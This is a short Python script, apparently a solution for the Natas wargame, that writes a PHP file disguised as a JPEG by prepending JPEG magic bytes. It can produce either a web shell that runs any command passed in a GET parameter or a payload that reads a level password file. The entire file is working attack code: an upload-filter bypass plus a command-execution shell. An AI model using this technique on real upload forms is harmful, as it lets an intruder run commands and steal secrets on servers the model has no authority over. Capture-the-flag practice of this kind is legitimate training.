
from binascii import unhexlify


def generate_payload(web_shell=False, show_pass=False):

    if web_shell and not show_pass:

        payload = '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); }; ?>'.encode('utf-8')
        name = 'webshell.php'

    elif show_pass and not web_shell:

        payload = '<?php echo "<pre>"; system("cat /etc/natas_webpass/natas14"); echo "</pre>"; ?>'.encode('utf-8')
        name = 'showpass.php'

    else:
        raise RuntimeError('Select one payload.')

    # Signature header to be added to fake jpg
    sig = unhexlify('ffd8ffdb')

    payload = sig + payload

    # Create the fake jpg file and add the magic header
    with open(name, 'wb') as exploit:
        exploit.write(payload)
        exploit.close()

    # Payload filename for reuse
    return name
